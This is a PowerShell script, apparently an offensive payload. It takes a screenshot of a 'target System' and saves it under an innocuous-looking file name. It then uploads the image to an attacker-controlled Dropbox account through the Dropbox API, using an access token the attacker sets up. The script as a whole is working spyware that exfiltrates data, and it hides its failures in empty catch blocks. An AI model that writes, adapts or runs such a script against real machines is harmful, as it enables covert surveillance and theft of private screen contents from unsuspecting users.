<#
============================================= Screenshot to Dropbox ========================================================

SYNOPSIS
This script takes a screenshot of the desktop and posts to a Dropbox account (with a developer app and token).

SETTING UP DROPBOX
goto https://www.dropbox.com/developers/apps
click 'create app'
name it and select 'full dropbox' permission
open your newly created app and click 'Generate Token' in the 0auth section.
copy that token into your script.

USAGE
1. Input your credentials below
2. Run Script on target System
3. Check Dropbox for results

#> 

#=========================================================================================
$accessToken = "YOUR_DROPBOX_TOKEN_HERE"
$localFolderPath = "$env:USERPROFILE"
#=========================================================================================

New-Item -ItemType "directory" -Path "$env:temp/img"

$imgFile = "$env:temp\img\IMG-0292.png"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($imgFile, [System.Drawing.Imaging.ImageFormat]::png)

sleep 1

$computerName = "$env:COMPUTERNAME"
$computerNameAsString = $computerName.ToString()
$dropboxCreateFolderUrl = "https://api.dropboxapi.com/2/files/create_folder_v2"

#=========================================================================================

$dropboxFolderPath = $computerName.ToString()
$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"

$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/octet-stream"
}
$body = @{
    "path" = "/$computerName"
    "autorename" = $true
} | ConvertTo-Json

$files = Get-ChildItem -Path "$env:temp\img" -Include "*.png" -Recurse

foreach ($file in $files) {
    $relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\')
    $dropboxFilePath = "$dropboxFolderPath/$relativePath".Replace('\', '/')
    $headers["Dropbox-API-Arg"] = "{`"path`": `"/$dropboxFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
        $response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
    }
    catch {}
}
